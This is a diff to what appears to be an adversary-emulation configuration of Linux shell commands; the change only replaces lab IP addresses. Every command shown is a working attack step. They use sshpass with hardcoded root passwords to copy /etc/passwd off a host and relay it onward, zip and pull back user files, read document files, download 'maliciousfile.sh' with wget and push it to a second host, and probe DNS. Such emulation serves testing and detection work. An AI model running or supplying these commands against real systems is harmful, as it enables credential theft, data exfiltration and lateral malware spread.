@@ -10,7 +10,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'split -b 3M /etc/passwd /tmp/passwd.part.' && sshpass -p RootPass123 scp -o StrictHostKeyChecking=no root@172.21.0.20:/tmp/passwd.part.* ./ && sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'cat /tmp/passwd.part.* | sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.22.0.20 \"cat > /tmp/passwd_reassembled\"'"
+        "command": "sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@192.168.20.30 'split -b 3M /etc/passwd /tmp/passwd.part.' && sshpass -p RootPass123 scp -o StrictHostKeyChecking=no root@192.168.20.30:/tmp/passwd.part.* ./ && sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@192.168.20.30 'cat /tmp/passwd.part.* | sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@192.168.30.40 \"cat > /tmp/passwd_reassembled\"'"
       }
     ]
   },
@@ -25,7 +25,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "host hostb.dynamic.local 172.21.0.20 && dig @172.21.0.20 hostb.dynamic.local A && nc -vz 172.21.0.20 53"
+        "command": "host hostb.dynamic.local 192.168.20.30 && dig @192.168.20.30 hostb.dynamic.local A && nc -vz 192.168.20.30 53"
       }
     ]
   },
@@ -40,7 +40,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p Passw0rd ssh attacker@172.21.0.20 'find /home/attacker -type f -newermt 2021-01-01 ! -name archive.zip -exec zip /tmp/archive.zip {} +' && sshpass -p Passw0rd scp attacker@172.21.0.20:/tmp/archive.zip ./archive.zip"
+        "command": "sshpass -p Passw0rd ssh attacker@192.168.20.30 'find /home/attacker -type f -newermt 2021-01-01 ! -name archive.zip -exec zip /tmp/archive.zip {} +' && sshpass -p Passw0rd scp attacker@192.168.20.30:/tmp/archive.zip ./archive.zip"
       }
     ]
   },
@@ -55,7 +55,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "dig @172.21.0.20 malicious.example A +noall +answer"
+        "command": "dig @192.168.20.30 malicious.example A +noall +answer"
       }
     ]
   },
@@ -70,7 +70,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p RootPass123 scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /usr/bin/wget root@172.21.0.20:/tmp/wget && sshpass -p RootPass123  ssh -o StrictHostKeyChecking=no root@172.21.0.20 'wget http://172.21.0.20/maliciousfile.sh -O /tmp/malware && sshpass -p RootPass123  scp -o StrictHostKeyChecking=no /tmp/malware root@172.22.0.20:/tmp/malware'"
+        "command": "sshpass -p RootPass123 scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /usr/bin/wget root@192.168.20.30:/tmp/wget && sshpass -p RootPass123  ssh -o StrictHostKeyChecking=no root@192.168.20.30 'wget http://192.168.20.30/maliciousfile.sh -O /tmp/malware && sshpass -p RootPass123  scp -o StrictHostKeyChecking=no /tmp/malware root@192.168.30.40:/tmp/malware'"
       }
     ]
   },
@@ -85,7 +85,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'find /home/attacker -type f -name \"*.doc\" -o -name \"*.docx\" -o -name \"*.pdf\" -o -name \"*.txt\" -exec cat {} +'"
+        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@192.168.20.30 'find /home/attacker -type f -name \"*.doc\" -o -name \"*.docx\" -o -name \"*.pdf\" -o -name \"*.txt\" -exec cat {} +'"
       }
     ]
   },
